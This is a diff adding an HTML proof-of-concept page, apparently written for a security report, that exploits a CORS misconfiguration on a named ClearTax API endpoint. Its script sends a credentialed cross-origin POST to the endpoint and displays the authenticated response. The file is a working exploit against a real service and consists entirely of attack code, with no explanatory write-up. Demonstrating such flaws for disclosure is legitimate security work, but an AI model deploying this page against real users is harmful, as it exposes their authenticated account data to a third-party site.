@@ -1,0 +1,36 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>ClearTax CORS POC</title>
+</head>
+<body>
+    <h1>ClearTax CORS Exploit POC</h1>
+    <p>This page will send a request to ClearTax and show the response</p>
+    <div id="status">Loading...</div>
+    
+    <script>
+        var req = new XMLHttpRequest();
+        
+        req.onload = function() {
+            // Show the actual response in alert
+            alert("Response received:\n\n" + this.responseText);
+            
+            // Also show on page
+            document.getElementById('status').innerHTML = 
+                '<h2>Response:</h2>' +
+                '<pre>' + this.responseText + '</pre>';
+        };
+        
+        req.onerror = function() {
+            alert("Request failed!");
+            document.getElementById('status').innerHTML = 'Request failed!';
+        };
+        
+        // Send the exact request you showed
+        req.open('POST', 'https://app.mea.cleartax.com/api/kramer/v0/in-app-notification/action/authenticate', true);
+        req.withCredentials = true;
+        req.setRequestHeader('Content-Type', 'application/json');
+        req.send('{}');
+    </script>
+</body>
+</html>
